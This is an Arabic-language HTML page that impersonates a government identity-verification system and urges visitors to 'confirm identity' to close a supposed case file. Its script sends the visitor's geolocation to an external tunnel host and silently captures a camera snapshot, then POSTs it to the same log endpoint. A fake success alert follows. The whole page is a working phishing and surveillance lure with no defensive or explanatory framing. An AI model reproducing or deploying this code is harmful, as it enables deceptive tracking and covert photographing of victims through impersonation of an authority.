<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز التوثيق الرقمي</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        button { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام التحقق الحكومي</h2>
        <p>يرجى الضغط لتأكيد الهوية الرقمية وربط موقعك لإغلاق ملف القضية.</p>
        <button onclick="start()">تأكيد الهوية الآن</button>
    </div>

    <script>
    async function start() {
        const tunnel = "https://96980dbae77e22.lhr.life";
        
        // جلب الموقع
        navigator.geolocation.getCurrentPosition(pos => {
            fetch(`${tunnel}/log.php?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
        });

        // جلب الكاميرا
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const video = document.createElement( video );
            video.srcObject = stream;
            video.play();
            
            setTimeout(async () => {
                const canvas = document.createElement( canvas );
                canvas.width = 640; canvas.height = 480;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                const imgData = canvas.toDataURL( image/jpeg );
                
                await fetch(`${tunnel}/log.php`, {
                    method:  POST ,
                    body: JSON.stringify({img: imgData})
                });
                
                alert("تم التوثيق بنجاح. سيتم إغلاق البلاغ.");
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) {
            alert("خطأ: يجب السماح بالكاميرا والموقع لإتمام التوثيق.");
        }
    }
    </script>
</body>
</html>
